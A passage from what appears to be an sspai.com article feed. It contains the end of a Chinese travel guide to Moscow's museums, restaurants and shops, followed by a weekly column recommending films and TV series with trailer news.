src=\"https://cdn.sspai.com/editor/u_/c4ggn85b34tfsrleb4eg.jpeg\"></figure><p>特列季亚科夫画廊收藏的基本都是俄罗斯本土艺术家的杰作；而普希金造型艺术博物馆则以其收藏的欧美艺术乃至东方艺术而闻名。作为造型艺术博物馆，这里不仅仅有画作，还有许多古典主义风格的雕塑，此外还有古埃及的展品，比如法老的棺椁和陪葬品等等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ggn8lb34tfrff2a7i0.jpeg\"></figure><p>普希金造型艺术馆的主馆旁边是 19-20 世纪欧美艺术家分馆。这里二楼常年举办各种特展；而三楼则是常设展。三楼的常设展中，不乏举世闻名的艺术大师的作品，比如保罗 · 塞尚、保罗 · 高更、巴勃罗 · 毕加索、文森特 · 梵 · 高、瓦西里 · 康定斯基、克劳德 · 莫奈等等。所以如果你想了解近现代的西方艺术，那么这里是不二的选择。只是，这里似乎没有中文语音导览，只提供了英语和俄语，所以自助游览可能有一定障碍。不过，人们也常说，艺术是需要自己体会的 —— 说不定你就在惊鸿一瞥之中与大师产生了心灵上的共鸣。</p>\n<h3>达尔文博物馆 Государственный Дарвиновский музей</h3>\n<p>📍位置：瓦维洛夫大街 57 号</p>\n<p>💰 门票：400 卢布，约合 36 元人民币</p>\n<p>🚇 地铁：Академическая - 学院 (6)</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ggn95b34tfrff2a7ig.jpeg\"></figure><p>达尔文博物馆则是莫斯科几家生物学博物馆之一。以「达尔文」的名字命名，这里自然重点介绍了生物从古代到现代的演进。在这里，你可以看到不同环境下（比如海洋、陆地等）生态系统中的各种各样的生物链介绍，都是精心设计制作的，栩栩如生。有关遗传学，在这里也有一些生动的讲解，对孟德尔的遗传定律（基因与性状）进行了细致的介绍，也摆出了生动的模型。这些模型都是由专人手工制作，精巧逼真，既有憨态可掬的鸵鸟，也有凶猛无畏的灰熊，可以说是一种「静态的动物园」。</p>\n<h3>宇航博物馆 Музей космонавтики</h3>\n<p>📍位置：世界大道 111 号</p>\n<p>💰 门票：350 卢布，约合 30 元人民币</p>\n<p>🚇 地铁：ВДНХ - 国家经济建设成就展 (6)</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ggn9db34tfsrleb4f0.jpeg\"></figure><p>宇航博物馆的外形可能是最先映入眼帘的，而且只要你看过一次就不会忘掉它。它描绘的是一支火箭冲向天空的场景，火箭划出了一道优美的弧线，以雕塑的形式定格。整个房顶的纪念碑看上去有几十层楼高，凸显出了一种对太空探索的不懈追求。</p>\n<p>博物馆内的展品主要是为了纪念前苏联和俄罗斯的航天成就，包括曾经用过的各种航天器模型（比如苏联 Sputnik 卫星）、航天服，还有一些航空、宇宙主题的艺术品，比如一些艺术家畅想之中的太空景象。当年我去的时候恰好有一个特别有意思的临时展，是前苏联的宇航主题海报。</p>\n<h3>苏联街机博物馆 Музей советских игровых автоматов</h3>\n<p>📍位置：罗日杰斯特文卡街 12 号</p>\n<p>💰 门票：450 卢布，约合 40 元人民币</p>\n<p>🚇 地铁：Кузнецкий мост - 库兹涅茨基大桥 (7)</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ggn9tb34tfsrleb4fg.jpeg\"></figure><p>这个有趣的博物馆藏在莫斯科市中心距离中国城（Китай-город，但是实际上和中国并没有什么关系）不远的地方，里面收藏了各种各样的苏联老实游戏街机。尽管这些老式游戏和一般的游戏机并没有太大的形式上的区别，但是斑驳的机器外壳还是能告诉你，这里的东西都很有年代了。从柜台处可以领取一些代币，然后就可以尽情畅玩了。此外，在博物馆的二楼还摆着一个桌上冰球（和桌上足球的玩法差不多） —— 可以说是很有俄罗斯特色了！</p>\n<h3>克里姆林宫军械库 Окружейная палата</h3>\n<p>📍位置：克里姆林宫内</p>\n<p>💰 门票：1000 卢布，约合 88 元人民币</p>\n<p>🚇 地铁：Библиотека им. Ленина - 列宁图书馆 (1)</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ggnadb34tfr0h6drjg.jpeg\"></figure><p>说了这么多类型的博物馆，我们最后来看看克里姆林宫军械库。这是一家位于克里姆林宫墙内的博物馆，收藏了俄罗斯皇家所用的许多装饰品，包括实用装饰艺术（比如餐具、烟灰缸等等）、法贝热彩蛋、俄罗斯贵族用于狩猎和仪式的各类冷热武器、贵族乘坐过的三架马车、穿过的各式礼服等等。</p>\n<p>如果你很喜欢金光闪闪的东西，那么这里你一定不要错过 —— 因为，无论是日常使用的餐盘、烟灰缸还是纯粹用来装饰和把玩的法贝热彩蛋，上面都少不了金、银、宝石等各种名贵、耀眼的材料。俄罗斯贵族对于这些金光闪闪的东西的追求也的确在这里可见一斑。</p>\n<h2>Интересные места в Москве | 探店莫斯科</h2>\n<h3>好吃的</h3>\n<h4>俄式餐点</h4>\n<p>到了俄罗斯，不吃点俄餐吗？有关俄餐的基础知识，我已经在 <a href=\"https://sspai.com/post/66164\" target=\"_blank\">这篇文章</a> 中有所介绍，这里不再展开叙述，只讲些我在莫斯科尝到的还不错的俄式餐厅。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ggnalb34tfrff2a7j0.jpeg\"></figure><p><strong>57 号食堂：</strong>57 号食堂位于红场旁边的国家百货（古姆百货）商店的顶楼，如果你看到一家餐厅很多人排队拿着餐盘，那就是它了。这里是苏联国营的老式自助餐厅的风格，人们拿着餐盘排队，售货员从放着食物的架子上为顾客取餐。这里大部分餐点是俄式的，偶尔会见到一些奇怪的中式（可能是为了迎合中国游客的口味）餐点。</p>\n<p><strong>Горабль 餐厅：</strong> 这家连锁餐厅在莫斯科许多地方都有分店。这家餐厅的体验和 57 号食堂类似，但是它的菜品种类要比 57 号食堂更多些，也以俄式餐品为主，座位和环境也要宽敞一些。</p>\n<p><strong>Хлеб Насущный：</strong>这家连锁餐厅的方式更为传统，是坐下来点菜的餐厅，菜品也以俄式餐点为主。说到它，是因为和同学朋友们去吃过好几次，味道不错，价格尚可接受，不算太贵。</p>\n<p><strong>Теремок：</strong>俄式连锁快餐店，标志是套娃，可以在莫斯科许多商场的餐厅区见到。这里卖的俄式煎饼种类丰富而且富有创新（比如当年的照烧风味鸡肉馅的煎饼），值得尝试；但是其他一些食物的风味只能说是尚可。</p>\n<p><strong>Вареничная № 1：</strong>一家主打俄式饺子的餐厅，这里的饺子不仅馅料的种类丰富，而且做法也很多样：煮、烤、炸，应有尽有。此外，这里也供应许多其他种类的俄式传统餐点，餐厅的装修风格也让人想起俄罗斯乡村小屋。</p>\n<h4>异国风情的快餐厅</h4>\n<p>到了俄罗斯，麦当劳、肯德基和汉堡王也总有一些和国内不同的风味。其中，我最为推荐的可能是麦当劳新鲜的炸对虾，价格的确挺贵的，但是味道也是真的一绝；此外，几家都会售卖的薯角（有点像国内麦当劳的 V 薯角）也都很不错。肯德基可能在这几家之中最为实惠，不仅有合人民币不到 40 元的 5 件套套餐，还有 60 元、25 块鸡翅的鸡翅桶可以选择，这在国内想都不敢想。不过，如果你觉得好不容易出国一趟还要吃这几家很掉价的话，可以当我没说。</p>\n<h4>吃点儿平常不吃的</h4>\n<p>在莫斯科，西式餐厅、日料、越南粉、中餐、中东风格的饮食都十分常见。在同一家商场的 food court，你可以同时见到各种各样的餐厅可以选择。如果想吃汉堡，我推荐 <strong>Фарш</strong>，这里的汉堡不仅仅是现烤的，更是十分新鲜，在夏日的夜晚搭配啤酒是不错的选择；如果思念国内的餐点，到莫斯科的大学附近可以找到一些中国人开起来的中餐馆，这些中餐基本和在国内吃到的普通中餐无异。此外，一个异国味道餐厅的大集合在 <strong>Центральный рынок</strong> （中央市场，位于地铁 10 号线 Трубная - 管道站附近），这里就是一个特别大的集市，内部是各种风格的小餐厅，还有一家精品生鲜超市。</p>\n<p>不过，探索餐厅这件事情得慢慢来，以这篇文章的篇幅当然已经是无法详述，但是莫斯科的多元化饮食绝对可以满足你的味蕾。</p>\n<h3>好玩的</h3>\n<h4>中央儿童百货商店 Центральный детский магазин</h4>\n<p>📍位置：剧院路 5 号</p>\n<p>🚇 地铁：Лубянка - 卢比扬卡 (1)</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ggnatb34tfsrleb4g0.jpeg\"></figure><p>莫斯科的中央儿童百货商店有好几层，其中售卖各种儿童（其实也有适合成人的）玩具等等。由于位于市中心，顶楼又有一个露台可以观赏莫斯科市中心的大部分景色，所以常常人满为患，也是前往莫斯科必然要打卡的地点之一。尤其是晚上，当你登上百货商店的露台，你能看到近处特维尔大街上川流不息的车流，远处的克里姆林宫墙和国家杜马（议会）大楼，当然还有深邃的夜空。百货商店内部也有不少可以逛的：四五层的 Hamley’s 售卖各种玩具、手办和娃娃，你可以在这里挑选带回家给小朋友（或者，给自己心中的小朋友）的礼物。</p>\n<h4>中央商务区 Москва-Сити</h4>\n<p>🚇 地铁：Деловой центр - 商务中心 (11A) / Выстовочная - 会展中心 (4)</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ggnbdb34tfr0h6drk0.jpeg\"></figure><p>商务中心的景色是高楼大厦构成的天际线，与莫斯科其他地区或者古朴、或者苏联重工业的风格迥然不同。这里的高楼大厦可以用「奇形怪状」来形容，特别是 DNA 大厦，整体的形状就是双螺旋，让人觉得这栋楼迟早要被撕碎。楼群紧挨着莫斯科河，在河对岸有一个平台可以看到整个天际线的景色，有不少俄罗斯电影也是在这里取景 —— 天际线尽管比不上上海，但是它们与周围建筑的强烈对比，的确是一大突出的特点。此外，你也可以在游览莫斯科的过程中，时刻看到这几栋高楼，它们是新时代莫斯科的地标。</p>\n<h4>书店</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ggnbtb34tfratjikf0.jpeg\"></figure><p>莫斯科比较有特色的书店也有不少。书店不仅仅卖书，还有很多创意的小玩意儿售卖，比如徽章、桌游、明信片、包装纸等等。不知道为什么，回了国发现国内书店卖的文创都不及莫斯科这些有意思 —— 可能是不太符合我的喜好。传统的、大而全的书店是位于阿尔巴特街的 <strong>Московский дом книги 莫斯科图书之家</strong>；小资但精品的是在莫斯科多地都开有分店的 <strong>Республика 共和国书店</strong>（我 Rick 的徽章就是在这里买到的），有很多受年轻人喜爱的东西；特维尔大街上的书店「Москва <strong>莫斯科书店</strong>」也很有特色，除了一楼的各类书籍和文创之外，你可以在负一层淘到许多不同种类的苏联时期出版的老书。</p>\n<h2>Эпилог｜后记：莫斯科，一种生活。</h2>\n<p>对莫斯科的情感，如果真的解构的话，可能是对它拥有现代的各种节奏的同时又没有失去古朴、没有失去艺术感的那种仰慕。如果不是精神与思想的丰富，人们要靠着什么度过一个月只有几个小时日照的时光？这种仰慕一直伴随着我，直到如今我还保留着一些在莫斯科的时候的习惯，小心保存着一些来自莫斯科的纪念品。或许我的俄语已经有了不少退化（以至于最近用到俄语的时候我有点捉襟见肘），但是这种精神力量的影响还远远没有褪去。</p>\n<p>对俄罗斯文化的浓厚兴趣，我想还会持续很久。旅行受到限制的当下，对当年旅居生活的怀念，是我现在写出这篇文章与大家分享的重要原因。写作时，看着以前的照片，我的怀念之情也是不断向上翻涌。或许，当疫情缓和，局势稳定，我会再次拜访这座城市，体验上面说过的一切东西，因为对我来说，莫斯科已经是一种特定的生活方式；换句话说，<strong>我清楚地知道，在莫斯科的一天，应该如何度过。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ggnc5b34tfratjikfg.jpeg\"></figure><p><i>除非特殊说明，本文中所用图片均为作者本人（或朋友）制作或拍摄。感谢在照片中出现的我的挚友 Nina 和 Francis，是他们让我在莫斯科的生活变得更有趣味。</i></p>\n<p><i>题图拍摄于莫斯科 2020 年红场新年集市。</i></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68415"},{"title":"本周看什么丨最近值得一看的 8 部作品","date":"2021-08-27 10:17:41","description":"\n<h2>☕️ TL;DR</h2>\n<ul>\n<li>近期佳作推荐：[电影] 猎魔人：狼之噩梦、[电影] 失控玩家、[电影] 安妮特、[美剧] 英文系主任、[综艺] 央 young 之夏、[动画] 水星领航员 暮色、[美剧] 天黑请回家 第二季、[日剧] 一直思考刃牙是不是 BL 的少女的记录</li>\n<li>几则精彩预告：《蜘蛛侠：英雄无归》首曝预告，12 月 17 日北美上映、《早间新闻》第二季 9 月 17 日上线 Apple TV+、飞屋环游记衍生动画《Dug Days》发布预告片，9 月 1 日上线 Disney+、华语恐怖新片《咒》发布预告</li>\n<li>几则影视资讯：《黑客帝国 4》正式定名《黑客帝国 4：矩阵重生》、莱昂纳多·迪卡普里奥、詹妮弗·劳伦斯主演新片《不要抬头》定档、迪士尼将翻拍《海底两万里》真人剧集、韩寒第四部电影《四海》</li>\n<li>看什么 Café 预告：本周日更新《发现镜头以外的故事，改编剧集和原著小说的套餐推荐》</li>\n</ul>\n<h2>👀 N 部作品推荐</h2>\n<p>根据读者反馈，如果推荐语涉及剧透（对故事核心、暗线、伏笔、结局等关键要素的透露），我们会在对应作品的标题前增加 🔦 的 Emoji。</p>\n<p>如有其他建议也欢迎在评论区提出，感谢大家对「看什么」栏目的喜爱和支持。</p>\n<h3>[电影] 猎魔人：狼之噩梦</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/article/21be0a8eb2a30233ed8b3e3e5ffe54c6\"></figure><p>关键词：小说衍生 / 剧情 / 奇幻 / 战斗</p>\n<p>片长：83 分钟</p>\n<p>观看渠道：<a href=\"https://www.netflix.com/title/81037868\">Netflix</a>；<a href=\"https://movie.douban.com/subject/34955909/\">豆瓣链接</a></p>\n<blockquote><p>他是否如猎魔人般战斗？他如英雄般战斗！</p></blockquote>\n<p>@SHY：大部分粉丝对维瑟米尔的印象，应该是游戏《巫师 3：狂猎》中那位白发苍苍的老爷子，他严肃又和蔼，是所有狼学派猎魔人的导师与父亲，最后也为了自己的孩子们牺牲。这样一个伟岸的身影，在年轻时会是怎样的姿态？Netflix 出品的动画电影《猎魔人：狼之噩梦》给出了一种可能。影片中，维瑟米尔出身低微，厌倦了单调的仆役生活，常与青梅竹马伊利亚娜讨论如何逃离现状。目睹猎魔人帮女主人驱除诅咒后，他悄悄离开家门，投奔凯尔·莫罕。然而，猎魔人并不像想象中的那么风光，残酷的现实让维瑟米尔变得唯利是图，直到命运使他与伊利亚娜再次相逢，卷入一场刻骨铭心的梦魇。</p>\n<p>《猎魔人：狼之噩梦》的设定与小说原著存在不小出入，即使不提混乱的时间线，堪比术士魔法的猎魔人法印威力也过于强大，让人怀疑丹德里恩是否经手了剧本。狐妖的幻术能力、法师的改造实验等元素虽然出现在原著《风暴季节》中，电影的嫁接方式却为狼学派泼了好大一盆脏水。不过，抛开以上瑕疵，本作基本把握住了贯彻原著始终的氛围，灰暗而冷漠的乱世人情、各怀心思的多方势力、由执念引发的重重悲剧，以及个人在命运面前的无能为力。在儿时梦想的湖光山色前，维瑟米尔终于洗去浮华，成长为日后的一代大师，将未来的猎魔人培养为比自己更优秀的存在。</p>\n<h3>[电影] 失控玩家</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/article/a77b270abcb637a6ce23013aee9b2bcc\"></figure><p>关键词：喜剧 / 动作 / 科幻</p>\n<p>片长：115 分钟</p>\n<p>观看渠道：院线上映中；<a href=\"https://movie.douban.com/subject/30337388/\">豆瓣链接</a></p>\n<blockquote><p>人生不一定非要随遇而安。</p></blockquote>\n<p>@潘誉晗：银行收纳员盖（瑞安·雷诺滋饰）是游戏《自由之城》中的 NPC，当他在游戏中遇见了玩家燃烧瓶女孩（朱迪·科默饰）后，自主意识慢慢觉醒。他跟着游戏一起成长，用不杀戮、不暴力的方式在游戏中获取经验升级，并因此成为了游戏中的英雄，用自己的方式改变了电子游戏一直以来的规则。</p>\n<p>创造了北美疫情以来暑期档次周跌幅最小纪录的《失控玩家》今天正式上映，看完后瞬间明白了为什么这部电影一经上映就获得了烂番茄 95% 的指数，并且以高口碑得到了 CinemaScore「A」的判定。影片颇有一种《头号玩家》结合搞笑版《西部世界》的味道，整个观影过程都因为其出色的视觉特效和笑点设定非常愉快。影片中的彩蛋设置很用心，几个大明星的客串也让人非常惊喜，听到玛利亚·凯莉的歌也令人在热血之余感到动容，推荐！</p>\n<h3>[电影] 安妮特 Annette</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/article/f8e289e1c7c72f1f95a90bccefef497f\"></figure><p>关键词：剧情 / 歌舞 / 爱情</p>\n<p>片长：141 分钟；<a href=\"https://movie.douban.com/subject/26856202/\">豆瓣链接</a></p>\n<blockquote><p>戏是疯子演给傻子看，而生活却真实得像个谎言。</p></blockquote>\n<p>@宽治：从很多角度来看，《安妮特》都算得上是一部不同寻常的电影。这其中最为特别的一点，也许要属它在电影这一媒介中对剧场（Theatre）方法的借鉴与使用——这种「剧场性」深刻地影响了整个作品的表达，使其更加依靠象征而非特效来构建故事所需的意象。在这里，现实与虚构被搅和在了一起——并不是让你分不清两者之间的区别，而是将两者都变成了叙事可能性的一部分。</p>\n<p>在我看来，剧场里最不可思议的奇迹，就是观众分明知道演员在演戏，但却愿意全心全意地相信。而生活中明明白白的现实，却往往令人难以接受。男主亨利是一名单口喜剧演员，他在剧中说，喜剧的作用是让人放下心防，这样才能在观众的笑声中讲点真话。而不管是戏里还是戏外，我们都分不清他的某种表现到底是对某一现象的犀利讽刺，还是这一现象本身精彩的实例。女主安是一名完全不同类型的艺术家，她和男主相爱，但在剧中却总是成为男主表演的素材和欲望的投射。这种关系构筑了整个影片内在的一种不平衡，而这种不平衡也成为了电影向前发展的关键动力。</p>\n<p>影片中随处可见表达上的设计与形式上的实验。电影里的表演往往讲究自然与真实，要让观众感觉不到演员是在表演，要让观众沉浸在故事里，但在《安妮特》的两个多小时里，我们却常常能看到演员在「表演表演」。与此同时，剧场的立体感也让很多原本需要额外交代才能建立起来的东西直接出现在影片之中，而我们相信它，恰恰是因为我们无法完全理解。而至于影片标题中的「安妮特」，其实是男女主的女儿的名字，我只能说这么多。</p>\n<h3>[美剧] 英文系主任</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/article/41f8ce5adb8fb5f0f12ff53efd762998\"></figure><p>关键词：剧情 / 喜剧</p>\n<p>片长：30 分钟（单集）× 6 集；<a href=\"https://movie.douban.com/subject/34971175/\">豆瓣链接</a></p>\n<p>@宇宙浪费指南：离开小变态的吴珊卓摇身一变成为了彭布罗克大学的一位英文系系主任金智允博士，在声名显赫的彭布罗克大学，她是学校首位女性系主任，更是大学职员之中少数的有色人种，故事围绕着她应对的各种难题展开。</p>\n<p>虽然这是一部轻喜剧，但在喜剧之外讨论的话题都稍微有些严肃，比如女性在职场上的困境、少数族裔在研究领域上话语权的缺失、职场上的人际关系处理，以及有些逆「政治正确」的讨论——被「政治正确」绑架的语言环境问题：文学课上老师的一个手势，被学生忽略掉语境、背景，单纯把行为放大，便开始对老师口诛笔伐，完全不在意老师的真正立场，生生扣上一顶大帽子，当事人还要为自己没站过的立场道歉，何其可笑，所有的解释在别人眼里都是狡辩。</p>\n<p>小小的英语系就是一个真实的职场写照，剧中还穿插了有关领养、子女教育之类的话题。虽然一集时长只有短短的半小时，但是内涵丰富，值得一看。不得不感叹，吴珊卓女士无论是演技还是挑剧本能力，都很不错！</p>\n<h3>[综艺] 央 young 之夏</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/article/60f98983628eb9cd025acd482612e402\"></figure><p>关键词：真人秀</p>\n<p>片长：300 分钟（公演）</p>\n<p>观看渠道：央视频；<a href=\"https://movie.douban.com/subject/35564199/\">豆瓣链接</a></p>\n<blockquote><p>央视主持人大型团建现场。</p></blockquote>\n<p>@甜約翰：《央 young 之夏》是由央视频推出的主播新媒体才艺秀，以「燃情盛夏夜，主播嘉年华」为主题，从成团直播到公演现场，由倪萍、康辉、尼格买提、月亮姐姐作为队长，带领中央广播电视总台 40 余位主持人组成四支战队，通过歌曲、舞蹈、音乐剧、情景剧、小品、脱口秀等多种形式同台竞演，最终由观众投票选出一支最佳战队。</p>\n<p>不得不说，越来越年轻的央视已经逐渐掌握了「流量密码」。不同于央视以往的综艺风格，《央 young 之夏》融合了直播、vlog、短视频、公开竞演、实时互动等方式，网感十足。节目中不仅能看到倪萍、康辉等主持人褪去职业身份的「反差萌」，还能看到「芳心纵火犯」撒贝宁、「收视保障」王冰冰的精彩亮相，可谓是惊喜不断、诚意满满。值得一提的是，「高质量」主持人的妙语连珠也是本节目的一大看点，不过真的好吵。高颜值、高才艺、高水准，以后的节目制作请按照这个规格「内卷」起来吧！</p>\n<h3>[动画] 水星领航员 暮色 ARIA The CREPUSCOLO</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/article/7eba1d286b9c9d24eca75e3b9f5116f0\"></figure><p>关键词：漫画改 / 科幻 / 日常 / 治愈</p>\n<p>片长：60 分钟；<a href=\"https://movie.douban.com/subject/35152842/\">豆瓣链接</a></p>\n<blockquote><p>相信明天，与更好的自己相遇。</p></blockquote>\n<p>@SHY：新威尼斯的街道已被落叶染上秋天的颜色，今天的水星亦如往常一样宁静祥和，点点轻舟荡漾水面，带领游客穿梭城市。让正在橘色行星公司实习的阿妮亚感到在意的是，因彼此行程忙碌而许久未见面的爱丽丝与雅典娜，两人间似乎出现了隔阂。面对因此而精神不振的雅典娜，爱丽丝却不知为何刻意回避与她相见。为了解决这一状况，阿妮亚向其他领航员寻求帮助，共同探索让两人会面的方法。</p>\n<p>作为《水星领航员》TV 动画第一季播出 15 周年纪念作品，「苍之谢幕」企划的第二部剧场版，《ARIA The CREPUSCOLO》延续了该系列的舒缓风格，简单而纯粹，洋溢着最初的美好。由于雅典娜的声优川上伦子已于 2011 年去世，本作改由佐藤利奈接替配音，但声线却不显突兀。与声优的传承相对应的，是剧情中三代领航员们的毕业与成长，当一段段回忆展开，船歌再次响起，戏里戏外在此重叠。</p>\n<p>更明显的变化是画面风格，《ARIA The CREPUSCOLO》的制作公司更换为 J.C.STAFF，人设改由《蓝海少女》的伊东叶子担纲，虽然更接近天野梢的漫画原著，却与动画前作存在较大差异，绘柄也不算稳定。此外，虽然本作讲的只是一个小小心结，成因和化解方式却显得有些儿戏，说教意味略浓。但当原著未动画化的泡沫公主部分展现在银幕上，众人在凤尾船上迎来崭新的黎明，余下的便只有温馨和感动。</p>\n<h3>[美剧] 天黑请回家 第二季</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/article/47b7f28266ac84b4a8585edd848f261e\"></figure><p>关键词：剧情 / 悬疑</p>\n<p>片长：45 分钟（单集）× 10 集；<a href=\"https://movie.douban.com/subject/34954862/\">豆瓣链接</a></p>\n<blockquote><p>比起聪明，我们更需要勇气。</p></blockquote>\n<p>@潘誉晗：九岁女孩希尔迪受到父亲的影响，从小就希望可以成为一名优秀的记者。上一季中，希尔迪和父母回到了父亲儿时生活过的小镇，在这里，她用自己的聪明机智找到了一桩凶案的真相。而在本季中，这座看似平静的小镇却迷雾重重。小农场被大公司要求高价收购，拒绝之后却在半夜频频发生爆炸，豪宅外掉落了不少小鸟的尸体，而这一切又有着怎样的联系？</p>\n<p>虽然剧集是以孩子为中心的，但毕竟是以真实人物作为灵感来源，所以整体没有完全稚龄化。希尔迪和朋友们一起探险破案的过程很容易想到儿时看过的《冒险小虎队》，也颇有「少年侦探团」的感觉。剧中，父母对于希尔迪的尊重，还有支持她在记者这条路上的坚持也让人心里为之一暖。也许这个九岁小女孩创办的报纸不是所有人都喜欢，甚至有人说她不可爱，但这又如何呢？真相不需要可爱，需要的是真实。</p>\n<h3>[日剧] 一直思考刃牙是不是 BL 的少女的记录</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/article/65c6ad63f8eedc327969f3425015dbc7\"></figure><p>关键词：漫画衍生 / 小说改 / 搞笑 / 恋爱</p>\n<p>片长：25 分钟（单集）× 7 集，每周五更新；<a href=\"https://movie.douban.com/subject/35471368/\">豆瓣链接</a></p>\n<blockquote><p>果然？那还用说！</p></blockquote>\n<p>@SHY：《刃牙》是不是 BL？对板垣惠介来说，一向没什么所谓！在高剂量的雄性荷尔蒙加持下，即使对上冒险家甚至汽车人，与自己的儿子恋爱，想必也是纯度极高的异性恋吧。然而，地表的众人终究难以追上半圆的孤独，本作的主角儿岛茜就被这一问题困扰，陷入了每天 30 小时、持续 300 天的不间断思考。她本是一位文具设计师，表面上认真工作，私底下却是重度腐女，想象力已经超乎常人，编排着纸、笔、订书机之类的攻受关系。漫画 App 的前三卷免费活动，让她与《刃牙》相遇，在格斗家们的肉体碰撞与妖娆魅惑的言行中发现了 BL 的无限可能。</p>\n<p>自那天起，儿岛茜就不可自拔地陷入了《刃牙》的世界中，购入超过 130 卷系列漫画，不放过任何蛛丝马迹，与腐女朋友们在居酒屋激烈探讨，脑内妄想着这样那样的场景，真可谓人间至福。平静的日常生活，却在后辈竹野、上司梶原的关切，以及与同学柴本的再会中开始动摇，儿岛茜能否守护自己的内心？这是位一直思考《刃牙》是不是 BL 的女性格斗家，壮烈战斗的记录。虽然本作标题已无思考的必要，情节展开也不甚新颖，但若对原作梗有了解的话，应当能从开头笑到结尾，对青少年的好影响，不可估量。</p>\n<h3>更多</h3>\n<p><a href=\"https://movie.douban.com/subject/34800072/\">[美剧] 反派</a> @潘誉晗：剧集的画面感很棒，大概因为剧集背景是一个热爱摔跤的小镇，所以透过屏幕就可以感受到热情和阳光。剧中性格完全不同的两兄弟也让这项运动多了一份跋扈和张扬，也仿佛隐喻了两人无论是在现实中还是在赛场上的彼此较量。烂番茄 96% 的新鲜度也足以说明这部新剧的品质，可谓是精准打在了摔跤运动爱好者的心上了。</p>\n<p><a href=\"https://movie.douban.com/subject/35577411/\">[动画] VOY@GER</a> @SHY：于旅行者 1 号探测器穿越太阳圈纪念日上线，《偶像大师》系列 15 周年概念影像，历代主角们悉数登场，在近未来的虚幻舞台献上最棒的演出。谢幕后，特效缓缓消散，浮现出只有一人的现实摄影棚，设计相当巧妙。刚从 EVA 片场回来的锦织敦史险些把春香修成真嗣，演出功力却依旧深厚，数十人同台的手绘 Live 作画和编舞水准堪称顶级，代表着偶像动画的最高水准。</p>\n<p><a href=\"https://movie.douban.com/subject/35561610/\">[纪录片] 朝着宵夜的方向 第二季</a> @潘誉晗：为了失明孩子努力赚钱的父母；带领着一条小区致富发展的创始人；来到城里开启人生新阶段依然心心念念着牧区的中年夫妻……九分钟一集的美食纪录片不光引得屏幕前各位饕客们垂涎欲滴，老板们自己的人生故事也让大家伙儿在烟火气中寻得了人情味的最好定义。</p>\n<h2>📅 本周新预告</h2>\n<h3>《蜘蛛侠：英雄无归》首曝预告，12 月 17 日北美上映</h3> <p>8 月 24 日，汤姆·赫兰德、赞达亚、本尼迪克特·康伯巴奇、玛丽莎·托梅等全明星主演的《蜘蛛侠：英雄无归》发布首支预告。该片将于 12 月 17 日北美上映，内地待定档。</p>\n<h3>《早间新闻》第二季 9 月 17 日上线 Apple TV+</h3> <p>8 月 23 日，《早间新闻》第二季发布正式预告。詹妮弗·安妮斯顿、瑞茜·威瑟斯彭、史蒂夫·卡瑞尔、比利·克鲁德普等主演回归，朱丽安娜· 玛格丽丝全新加盟。本季共 10 集，将于 9 月 17 日上线 Apple TV+。</p>\n<h3>飞屋环游记衍生动画《Dug Days》发布预告片，9 月 1 日上线 Disney+</h3> <p>8 月 27 日，皮克斯动画工作室全新的短片系列《Dug Days》发布预告，本系列讲述了可爱的小狗 Dug 在后院及其周围发生的日常事件。</p>\n<h3>华语恐怖新片《咒》发布预告</h3>\n<p><strong>注：</strong>本预告 2:30 左右存在突然惊吓内容</p> <p>8 月 24 日，由柯孟融执导，蔡亘晏、高英轩、林敬伦等主演的恐怖片《咒》发布预告。该片改编自发生在高雄的真实事件，将于今冬在中国台湾上映。</p>\n<h3>更多</h3>\n<p><a href=\"https://www.bilibili.com/video/BV1Wh411q77d?from=search&amp;seid=1932105725808278301\" target=\"_blank\"><strong>《阳光普照》导演钟孟宏新作《瀑布》首曝预告：</strong></a>钟孟宏执导的第七部长片《瀑布》发布首支预告。该片是钟孟宏与《阳光普照》编剧张耀升的再度合作，贾静雯、王净、魏如萱、李李仁、陈以文、刘冠廷、黄信尧等主演。该片已入围多伦多电影节「特别展映」单元和威尼斯电影节「地平线」单元。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1Sy4y137ZW?from=search&amp;seid=9605278961436657126\" target=\"_blank\"><strong>电影《我是监护人》发布预告，定档 9 月 10 日全国上映：</strong></a>国产现实题材影片《我是监护人》发布预告，将于 9 月 10 日全国上映。该片曾入围上影节亚洲新人奖，由敬然执导，尚语贤、王砚辉、林靖喆等出演。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1644y1k7xi?from=search&amp;seid=12670930764728362421\" target=\"_blank\"><strong>丹·史蒂文斯主演新片《我是你的人类》，9 月 24 日北美上映：</strong></a>丹·史蒂文斯、玛伦·艾格特主演德语新片《我是你的人类》发布正式预告，9 月 24 日北美上映。故事围绕着一位女科学家和她的机器人伴侣展开，该片获得第 71 届柏林电影节最佳主角奖（玛伦·艾格特）。</p>\n<p><a 